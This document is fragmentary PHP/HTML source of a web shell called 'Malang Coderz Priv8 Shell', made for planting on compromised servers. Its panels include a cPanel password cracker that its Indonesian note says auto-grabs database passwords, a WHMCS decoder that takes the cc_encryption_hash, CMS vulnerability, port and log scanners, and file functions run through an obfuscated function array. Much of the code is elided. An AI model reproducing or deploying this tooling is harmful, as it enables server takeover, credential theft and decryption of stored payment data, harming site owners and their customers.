		<h2>Cpanel Crack Malang Coderz Priv8 Shell</h2>
		USER: <br>
		<textarea class = 'output' style='width: 450px; height: 150px;' name='user_cp'>";
						...
						echo "</textarea><br>
		PASS: <br>
		<textarea class= 'output' style='width: 450px; height: 200px;' name='pass_cp'>";
						...
						echo $cp_pass;
						echo "</textarea><br><br>
		<input class = 'inputzbut' type='submit' name='crack' style='width: 450px;' value='Crack'>
		</form><br>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center><br>";
					}
		...
		<p align='center' class='cgx2'>Domains and Users</p>";
					...
					echo "
<br>
<br><center><h2>Whmcs Decoder Malang Coderz Priv8 Shell</h2></center>
...
<tr><td>cc_encryption_hash</td><td><input type='text' class='inputz' size='38' name='cc_encryption_hash' value=''></td></tr><br>
<td>&nbsp;&nbsp;&nbsp;&nbsp;<INPUT class='inputzbut' type='submit'  value='Submit' name='Submit'></td>
</table>
</FORM>
</center>
<br>
";
					...
					echo "<br>";
					echo "<center><h2>Scanner Malang Coderz Priv8 Shell</h2></center><br>";
					echo "<center><form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-4'>
						<a class = 'inputz ajx btn' href = '?d=" . hex($d) . "&" . hex('cmsvuln') . "' style='width: 250px;' height='10'><center>CMS Vulnerability Scanner</center></a>
						</div>
						<div class = 'col-md-4'>
						<a class = 'inputz ajx btn' href = '?d=" . hex($d) . "&" . hex('port-scanner') . "' style='width: 250px;' height='10'><center>Port Scanner</center></a>
						</div>
						<div class = 'col-md-4'>
						<a class = 'inputz ajx btn' href = '?d=" . hex($d) . "&" . hex('logs-scanner') . "' style='width: 250px;' height='10'><center>Logs Scanner</center></a>
						</div>
						</div></form></center>";
					echo "";
...
';
					...
					echo "<center>";
					echo '<br>
<h2>CMS Vulnerability Scanner Malang Coderz Priv8 Shell</h2>
<form method="POST" action=""  class="header-izz">
    <p>Link&nbsp&nbsp<input class = "inputz" type="text" style="width:500px;" name="site" value="http://127.0.0.1/" >
    <br><br>
    CMS
    &nbsp&nbsp&nbsp<select class = "inputz"  name="pilihan" style=" width:500px;">
    <option>Wordpress</option>
    <option>Joomla</option>
    <option>Nukes</option>
    <option>Xoops</option> 
    </select><br><br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
    <input class = "inputz" type="submit" style="width: 150px; height: 40px; border-color=white;margin:10px 2px 0 2px;" value="Scan" class="kotak"></p>
</form></center><br>';
					// Start Scan :P :P ...
					if ($_POST) {
					...
					echo "<br><center>";
					echo '<table><h2>Ports Scanner Malang Coderz Priv8 Shell</h2><td>';
					...
					if (isset($_POST['host']) && is_numeric($_POST['end']) && is_numeric($_POST['start'])) {
		              ...
		              <input type="hidden" name="c" value="' . htmlspecialchars($GLOBALS['cwd']) . '">
		              <input type="hidden" name="charset" value="' . (isset($_POST['charset']) ? $_POST['charset'] : '') . '">
		              Host:<br> <input class = "inputz" type="text" name="host" value="localhost"/><br /><br />
		              Port start: <br><input class = "inputz type="text" name="start" value="0"/><br /><br />
		              Port end: <br><input type="text" name="end" value="5000"/><br /><br />
		              <input class = "inputz" type="submit" value="Scan Ports" />
		              </form></center><br /><br />';
						echo "</center>";
					...
					echo '<br>';
					echo "<Center>\n";
					echo "<h2>Log Hunter Malang Coderz Priv8 Shell</h2>";
					echo "<form action=\"\" method=\"post\">\n";
					?><br>Dir :<br><input class="inputz" style="width: 250px;" type="text" value="<?= getcwd(); ?>" name="shc_dir"><br><br><?php
																																			echo "<br>";
																																			echo "<input class = 'inputz' style='width:250px;' type=\"submit\" name=\"submit\" value=\"Scan Now!\"/>\n";
																																			echo "</form><br>\n";
...
*/
																																			...
																																			echo "<br><center><h2>About Malang Coderz</h2>";
																																			echo "Thanks For Taking Our Shell Today without you all we are means nothing :) <br><br>";
																																			echo "visit us : <a href = 'https://www.facebook.com/yudas1337' target = 'blank' class= 'inputzbut btn'>Pwnz!</a> <br><br>";
																																			echo "We Are : <br>
				...
				";
																																			...
																																			echo $a_ . '+FILE' . $b_ . '
									<form action="" method="post"><br>
										<input name="n" autocomplete="off" class="inputz col-md-3" type="text" value="">
										' . $d_ . '
								' . $c_;
																																			if (isset($_POST["n"])) {
																																				if (!$GNJ[25]($_POST["n"])) {
									...
									<form action="" method="post"><br>
										<input name="r" autocomplete="off" class="inputz col-md-3" type="text" value="' . uhex($_GET["r"]) . '">
										' . $d_ . '
								' . $c_;
																																			if (isset($_POST["r"])) {
																																				if ($GNJ[26]($_POST["r"])) {
																																			...
																																			echo '<table border="1" style="border-color:#000"class="explore">
						<thead>
							<tr>
								<th><center> Name </center></th>
								<th><center> Size </center></th>
								<th><center> Modified </center></th>
						...
						'
							...
							<td>
								...
								<img src = "data:image/png;base64,">
				...
				<footer class="x">
					<center>
						<hr>
						<br><br>&copy; Author : TheAlmightyZeus Recoded By ./Exorcism1337 - Malang Coderz ~ Indonesian Hacker Rulez </center>
				</footer>
				<?php
				if (isset($_GET["1"])) {
					echo $f;
